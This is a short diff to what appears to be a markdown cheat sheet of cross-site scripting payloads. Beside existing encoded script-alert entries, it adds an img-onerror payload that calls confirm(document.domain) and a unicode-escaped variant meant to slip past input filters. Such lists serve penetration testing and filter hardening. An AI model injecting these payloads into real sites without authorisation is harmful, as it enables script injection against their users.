@@ -66,6 +66,8 @@
 * `&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;`
 * `\u003Cscript\u003Ealert('XSS')\u003C/script\u003E`
 
+* <img src\=x onerror\=\"confirm(document.domain)\">
+* \\u003cimg\\u0020src\\u003dx\\u0020onerror\\u003d\\u0022confirm(document.domain)\\u0022\\u003e
 
 ---
 
